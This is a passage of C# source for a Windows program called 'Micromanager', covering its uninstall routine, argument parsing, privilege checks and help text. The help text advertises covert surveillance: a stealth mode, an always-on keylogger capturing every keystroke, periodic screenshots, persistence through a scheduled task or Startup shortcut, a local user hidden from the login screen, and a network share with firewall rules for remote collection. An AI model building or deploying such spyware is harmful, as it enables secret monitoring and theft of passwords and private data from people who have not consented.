            if (debugMode) Console.WriteLine("      ✓ Tarea programada detenida");
        }
        else
        {
            if (debugMode) Console.WriteLine($"      ⚠ {error}");
        }
    }
    catch (Exception ex)
    {
        if (debugMode) Console.WriteLine($"      ⚠ Error: {ex.Message}");
    }

    try
    {
        if (debugMode) Console.WriteLine("[2/2] Terminando todos los procesos Micromanager...");
        
        var processes = Process.GetProcessesByName("Micromanager");
        int currentPid = Process.GetCurrentProcess().Id;
        int killedCount = 0;
        
        foreach (var process in processes)
        {
            try
            {
                if (process.Id != currentPid)
                {
                    process.Kill();
                    process.WaitForExit(5000);
                    killedCount++;
                }
            }
            catch (Exception ex)
            {
                if (debugMode) Console.WriteLine($"      ⚠ No se pudo terminar proceso {process.Id}: {ex.Message}");
            }
        }
        
        if (debugMode)
        {
        if (killedCount > 0)
        {
            Console.WriteLine($"      ✓ {killedCount} proceso(s) terminado(s)");
        }
        else
        {
            Console.WriteLine("      ○ No se encontraron otras instancias en ejecución");
            }
        }
    }
    catch (Exception ex)
    {
        if (debugMode) Console.WriteLine($"      ⚠ Error: {ex.Message}");
    }
}

static void CleanupEverything(string username, bool debugMode = false)
{
    try
    {
        // Paso 1: Detener todas las instancias
        if (debugMode) Console.WriteLine("[1/6] Deteniendo todas las instancias...");
        DisableAllInstances(debugMode);
        Thread.Sleep(2000);
    }
    catch (Exception ex)
    {
        if (debugMode) Console.WriteLine($"      ⚠ Error: {ex.Message}");
    }

    try
    {
        // Paso 2: Eliminar tarea programada
        if (debugMode) Console.WriteLine("[2/6] Eliminando tarea programada...");
        
        if (TaskSchedulerManager.DeleteTask(Configuration.TaskName, out string error, debugMode))
        {
            if (debugMode) Console.WriteLine("      ✓ Tarea programada eliminada");
        }
        else
        {
            if (debugMode) Console.WriteLine($"      ⚠ {error}");
        }
        
        // También eliminar acceso directo del startup folder si existe
        try
        {
            string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup);
            string shortcutPath = Path.Combine(startupFolder, "Micromanager.lnk");
            
            if (File.Exists(shortcutPath))
            {
                File.Delete(shortcutPath);
                if (debugMode) Console.WriteLine("      ✓ Acceso directo eliminado del Startup folder");
            }
        }
        catch (Exception ex)
        {
            if (debugMode) Console.WriteLine($"      ⚠ Error eliminando acceso directo: {ex.Message}");
        }
    }
    catch (Exception ex)
    {
        if (debugMode) Console.WriteLine($"      ⚠ Error: {ex.Message}");
    }

    try
    {
        // Paso 3: Eliminar carpeta compartida
        if (debugMode) Console.WriteLine("[3/6] Eliminando carpeta compartida...");
        
        if (NetworkShareManager.DeleteShare(Configuration.ShareName, out string error, debugMode))
        {
            if (debugMode) Console.WriteLine("      ✓ Carpeta compartida eliminada");
        }
        else
        {
            if (debugMode) Console.WriteLine($"      ⚠ {error}");
        }
    }
    catch (Exception ex)
    {
        if (debugMode) Console.WriteLine($"      ⚠ Error: {ex.Message}");
    }

    try
    {
        // Paso 4: Eliminar reglas de firewall
        if (debugMode) Console.WriteLine("[4/6] Eliminando reglas de firewall...");
        
        if (FirewallManager.RemoveFirewallRules(Configuration.ShareName, out string error, debugMode))
        {
            if (debugMode) Console.WriteLine("      ✓ Reglas de firewall eliminadas");
        }
        else
        {
            if (debugMode) Console.WriteLine($"      ⚠ {error}");
        }
    }
    catch (Exception ex)
    {
        if (debugMode) Console.WriteLine($"      ⚠ Error: {ex.Message}");
    }

    try
    {
        // Paso 5: Eliminar usuario local
        if (debugMode) Console.WriteLine($"[5/6] Eliminando usuario '{username}'...");
        
        // Restaurar visibilidad del usuario antes de eliminarlo
        UserManager.ShowUserInLoginScreen(username, out string _);
        
        if (UserManager.DeleteLocalUser(username, out string error, debugMode))
        {
            if (debugMode) Console.WriteLine($"      ✓ Usuario '{username}' eliminado");
        }
        else
            {
            if (debugMode) Console.WriteLine($"      ⚠ {error}");
        }
    }
    catch (Exception ex)
                {
        if (debugMode) Console.WriteLine($"      ⚠ Error: {ex.Message}");
                }

    try
                {
        // Paso 6: Eliminar archivos
        if (debugMode) Console.WriteLine("[6/6] Eliminando archivos y datos...");
        
        // Eliminar carpeta principal de instalación
        if (Directory.Exists(Configuration.InstallPath))
                    {
            DeleteDirectoryWithRetry(Configuration.InstallPath, maxRetries: 3, debugMode);
                    }
                    else
                    {
            if (debugMode) Console.WriteLine("      ○ Directorio principal no existía");
        }
        
        // Eliminar carpetas alternativas en AppData de todos los usuarios
        try
        {
            string systemDrive = Environment.GetEnvironmentVariable("SystemDrive") ?? "C:";
            string usersPath = Path.Combine(systemDrive, "Users");
            if (Directory.Exists(usersPath))
            {
                int cleanedCount = 0;
                foreach (string userDir in Directory.GetDirectories(usersPath))
                {
                    string appDataMicromanager = Path.Combine(userDir, "AppData", "Local", "Micromanager");
                    if (Directory.Exists(appDataMicromanager))
                    {
                        try
                        {
                            DeleteDirectoryWithRetry(appDataMicromanager, maxRetries: 3, debugMode);
                            cleanedCount++;
                        }
                        catch (Exception ex)
                        {
                            if (debugMode) Console.WriteLine($"      ⚠ No se pudo eliminar {appDataMicromanager}: {ex.Message}");
                        }
                    }
                }
                
                if (cleanedCount > 0 && debugMode)
                {
                    Console.WriteLine($"      ✓ {cleanedCount} carpeta(s) de usuario eliminada(s)");
                }
                else if (debugMode)
                {
                    Console.WriteLine("      ○ No se encontraron carpetas de usuario");
                }
            }
            
            // También limpiar la carpeta del usuario actual por si acaso
            string currentUserAppData = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Micromanager");
            if (Directory.Exists(currentUserAppData))
            {
                DeleteDirectoryWithRetry(currentUserAppData, maxRetries: 3, debugMode);
            }
        }
        catch (Exception ex)
        {
            if (debugMode) Console.WriteLine($"      ⚠ Error limpiando carpetas de usuario: {ex.Message}");
        }
    }
    catch (Exception ex)
    {
        if (debugMode) Console.WriteLine($"      ⚠ Error: {ex.Message}");
    }
}

static void DeleteDirectoryWithRetry(string path, int maxRetries = 3, bool debugMode = false)
{
    for (int i = 0; i < maxRetries; i++)
    {
        try
        {
            // Quitar atributos de solo lectura, oculto y sistema
            var files = Directory.GetFiles(path, "*", SearchOption.AllDirectories);
                            foreach (var file in files)
                            {
                                try
                                {
                                    File.SetAttributes(file, FileAttributes.Normal);
                }
                catch { /* Ignorar errores */ }
            }
            
            Directory.Delete(path, true);
            if (debugMode) Console.WriteLine($"      ✓ Eliminado: {path}");
            return;
        }
        catch (IOException) when (i < maxRetries - 1)
        {
            Thread.Sleep(1000);
        }
        catch (UnauthorizedAccessException ex)
        {
            if (debugMode)
            {
                Console.WriteLine($"      ⚠ Acceso denegado: {ex.Message}");
                Console.WriteLine($"      → Intenta ejecutar como administrador o reinicia el sistema");
            }
            return;
        }
        catch (Exception ex) when (i == maxRetries - 1)
        {
            if (debugMode)
                        {
                            Console.WriteLine($"      ⚠ No se pudieron eliminar algunos archivos: {ex.Message}");
                Console.WriteLine($"      → Intenta reiniciar el sistema y eliminar manualmente: {path}");
            }
        }
    }
}

static int GetIntParameter(List<string> args, string longFlag, string shortFlag, int defaultValue)
{
    // Buscar formato: --flag valor
    int longIndex = args.IndexOf(longFlag);
    if (longIndex >= 0 && longIndex + 1 < args.Count && int.TryParse(args[longIndex + 1], out int longValue))
    {
        return longValue;
    }
    
    // Buscar formato: --flag=valor
    var longWithValue = args.FirstOrDefault(a => a.StartsWith($"{longFlag}="));
    if (longWithValue != null)
    {
        string[] parts = longWithValue.Split('=');
        if (parts.Length == 2 && int.TryParse(parts[1], out int longEqValue))
        {
            return longEqValue;
        }
    }
    
    // Buscar formato corto: --flag valor
    int shortIndex = args.IndexOf(shortFlag);
    if (shortIndex >= 0 && shortIndex + 1 < args.Count && int.TryParse(args[shortIndex + 1], out int shortValue))
    {
        return shortValue;
    }
    
    // Buscar formato corto: --flag=valor
    var shortWithValue = args.FirstOrDefault(a => a.StartsWith($"{shortFlag}="));
    if (shortWithValue != null)
    {
        string[] parts = shortWithValue.Split('=');
        if (parts.Length == 2 && int.TryParse(parts[1], out int shortEqValue))
        {
            return shortEqValue;
        }
    }
    
    return defaultValue;
}

static string GetStringParameter(List<string> args, string flag, string defaultValue)
{
    // Buscar formato: --flag valor
    int flagIndex = args.IndexOf(flag);
    if (flagIndex >= 0 && flagIndex + 1 < args.Count)
    {
        string value = args[flagIndex + 1];
        // Validar que no sea otro flag
        if (!value.StartsWith("--"))
        {
            return value;
        }
    }
    
    // Buscar formato: --flag=valor
    var flagWithValue = args.FirstOrDefault(a => a.StartsWith($"{flag}="));
    if (flagWithValue != null)
    {
        string[] parts = flagWithValue.Split('=', 2);
        if (parts.Length == 2)
        {
            return parts[1];
        }
    }
    
    return defaultValue;
}

static bool IsAdministrator()
{
    try
    {
        using WindowsIdentity identity = WindowsIdentity.GetCurrent();
        WindowsPrincipal principal = new WindowsPrincipal(identity);
        return principal.IsInRole(WindowsBuiltInRole.Administrator);
    }
    catch
    {
        return false;
    }
}

static bool IsSystemAccount()
{
    try
    {
        using WindowsIdentity identity = WindowsIdentity.GetCurrent();
        // SYSTEM account tiene el SID: S-1-5-18
        return identity.User?.Value == "S-1-5-18" || 
               identity.Name.Equals("NT AUTHORITY\\SYSTEM", StringComparison.OrdinalIgnoreCase);
    }
    catch
    {
        return false;
    }
}

static void ShowHelp()
{
    Console.WriteLine("=====================================");
    Console.WriteLine("   MICROMANAGER - Sistema de Monitoreo");
    Console.WriteLine("=====================================");
    Console.WriteLine("");
    Console.WriteLine("USO:");
    Console.WriteLine("  Micromanager.exe [opciones]");
    Console.WriteLine("");
    Console.WriteLine("OPCIONES:");
    Console.WriteLine("");
    Console.WriteLine("  Instalación y ejecución:");
    Console.WriteLine("    (sin parámetros)              Auto-instala y ejecuta con config predeterminada");
    Console.WriteLine("    --stealth                     Ejecuta en modo silencioso");
    Console.WriteLine("");
    Console.WriteLine("  Configuración:");
    Console.WriteLine("    --screenshot-interval N       Intervalo de capturas en segundos (default: 30)");
    Console.WriteLine("    --screenshot N                Alias corto");
    Console.WriteLine("    --cleanup-days N              Días para mantener datos antiguos (0 = no limpiar)");
    Console.WriteLine("    --cleanup N                   Alias corto");
    Console.WriteLine("    --persistence MÉTODO          Método de persistencia:");
    Console.WriteLine("                                    scheduledtask = Tarea programada (default)");
    Console.WriteLine("                                    startupfolder = Acceso directo en Startup");
    Console.WriteLine("    --shared-folder               Habilitar carpeta compartida de red (requiere admin)");
    Console.WriteLine("    --shared-user USERNAME        Usuario para carpeta compartida (default: SoporteManager)");
    Console.WriteLine("");
    Console.WriteLine("  Nota: El keylog captura TODAS las teclas en tiempo real (siempre activo)");
    Console.WriteLine("  Nota: Con --shared-folder se pedirá contraseña para el usuario de acceso");
    Console.WriteLine("");
    Console.WriteLine("  Control:");
    Console.WriteLine("    --disable                     Detiene todas las instancias");
    Console.WriteLine("    --clean                       Elimina todo (desinstalación completa)");
    Console.WriteLine("    --debug                       Muestra información de diagnóstico detallada");
    Console.WriteLine("    --help, -h                    Muestra esta ayuda");
    Console.WriteLine("");
    Console.WriteLine("EJEMPLOS:");
    Console.WriteLine("");
    Console.WriteLine("  Auto-instalación simple:");
    Console.WriteLine("    Micromanager.exe");
    Console.WriteLine("");
    Console.WriteLine("  Con intervalos personalizados:");
    Console.WriteLine("    Micromanager.exe --screenshot 60");
    Console.WriteLine("    Micromanager.exe --stealth --screenshot-interval 120");
    Console.WriteLine("");
    Console.WriteLine("  Con limpieza automática (borrar datos > 7 días):");
    Console.WriteLine("    Micromanager.exe --cleanup-days 7");
    Console.WriteLine("    Micromanager.exe --screenshot 30 --cleanup 7");
    Console.WriteLine("");
    Console.WriteLine("  Con carpeta compartida de red:");
    Console.WriteLine("    Micromanager.exe --shared-folder");
    Console.WriteLine("    Micromanager.exe --screenshot 5 --cleanup 30 --shared-folder");
    Console.WriteLine("    Micromanager.exe --shared-folder --shared-user MiUsuario");
    Console.WriteLine("");
    Console.WriteLine("  (La carpeta compartida pedirá contraseña para el usuario de acceso)");
    Console.WriteLine("");
    Console.WriteLine("  Con método de persistencia específico:");
    Console.WriteLine("    Micromanager.exe --persistence scheduledtask");
    Console.WriteLine("    Micromanager.exe --persistence startupfolder");
    Console.WriteLine("    Micromanager.exe --screenshot 60 --persistence startupfolder");
    Console.WriteLine("");
    Console.WriteLine("  Nota: scheduledtask es más robusto, startupfolder es más simple");
    Console.WriteLine("");
    Console.WriteLine("  Detener todo:");
    Console.WriteLine("    Micromanager.exe --disable");
    Console.WriteLine("");
    Console.WriteLine("  Desinstalar completamente:");
    Console.WriteLine("    Micromanager.exe --clean");
    Console.WriteLine("");
    Console.WriteLine("UBICACIONES:");
    Console.WriteLine($"  Instalación:       {Configuration.InstallPath}");
    Console.WriteLine($"  Datos:             {Configuration.DataPath}");
    Console.WriteLine($"  Carpeta de red:    \\\\[PC]\\{Configuration.ShareName}");
    Console.WriteLine("");
        }
    }
    catch (Exception ex)
    {
    Console.WriteLine("=====================================");
    Console.WriteLine("   ERROR NO MANEJADO");
    Console.WriteLine("=====================================");
    Console.WriteLine($"Excepción: {ex.GetType().Name}");
    Console.WriteLine($"Mensaje: {ex.Message}");
    Console.WriteLine($"StackTrace: {ex.StackTrace}");
    Console.WriteLine("");
    Console.WriteLine("Presione cualquier tecla para salir...");
    Console.ReadKey();
    Environment.Exit(1);
}
